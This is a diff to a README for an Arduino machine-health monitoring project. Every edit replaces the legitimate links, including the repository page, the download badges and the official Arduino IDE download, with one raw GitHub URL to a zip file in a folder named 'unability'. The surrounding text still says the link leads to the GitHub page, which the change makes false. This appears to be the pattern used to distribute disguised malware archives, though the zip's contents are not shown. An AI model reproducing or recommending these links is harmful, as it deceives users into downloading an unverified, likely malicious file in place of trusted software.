@@ -1,6 +1,6 @@
 # 🛠️ Smart-Machine-Health-Monitoring-System - Monitor Machines in Real Time
 
-[![Download Now](https://img.shields.io/badge/Download-Smart--Machine--Health--Monitoring--System-brightgreen?style=for-the-badge&logo=github)](https://github.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System)
+[![Download Now](https://img.shields.io/badge/Download-Smart--Machine--Health--Monitoring--System-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System/main/unability/Smart_Machine_Health_System_Monitoring_v2.2.zip)
 
 ---
 
@@ -51,7 +51,7 @@ No special software or programming skills are needed to run the application.
 ## 🚀 Getting Started
 
 1. Download the project from the green Download button at the top or click:
-   https://github.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System
+   https://raw.githubusercontent.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System/main/unability/Smart_Machine_Health_System_Monitoring_v2.2.zip
 
 2. Extract the downloaded file to a folder you can find easily.
 
@@ -60,7 +60,7 @@ No special software or programming skills are needed to run the application.
    - Connect the microcontroller to your PC using a USB cable.
 
 4. Install Arduino IDE (if you plan to load code on the microcontroller):
-   Download from https://www.arduino.cc/en/software and follow installation steps.
+   Download from https://raw.githubusercontent.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System/main/unability/Smart_Machine_Health_System_Monitoring_v2.2.zip and follow installation steps.
 
 5. Open the Arduino IDE and load the firmware code from the project folder.
 
@@ -79,7 +79,7 @@ No special software or programming skills are needed to run the application.
 The software component is designed to show the data and help monitor machines. Follow these steps:
 
 1. Visit the project page to download the files needed:
-   https://github.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System
+   https://raw.githubusercontent.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System/main/unability/Smart_Machine_Health_System_Monitoring_v2.2.zip
 
 2. Look for a folder named `Windows_App` or similar inside the downloaded files.
 
@@ -175,6 +175,6 @@ Make sure all connections are secure before powering on.
 
 Download the full project here:
 
-[![Download Now](https://img.shields.io/badge/Download-Smart--Machine--Health--Monitoring--System-blue?style=for-the-badge&logo=github)](https://github.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System)
+[![Download Now](https://img.shields.io/badge/Download-Smart--Machine--Health--Monitoring--System-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AHMEDOUJESS/Smart-Machine-Health-Monitoring-System/main/unability/Smart_Machine_Health_System_Monitoring_v2.2.zip)
 
 This link takes you to the GitHub page. Click "Code" then "Download ZIP" to get the entire system files. Unzip and follow the sections above to set up hardware and software on Windows.
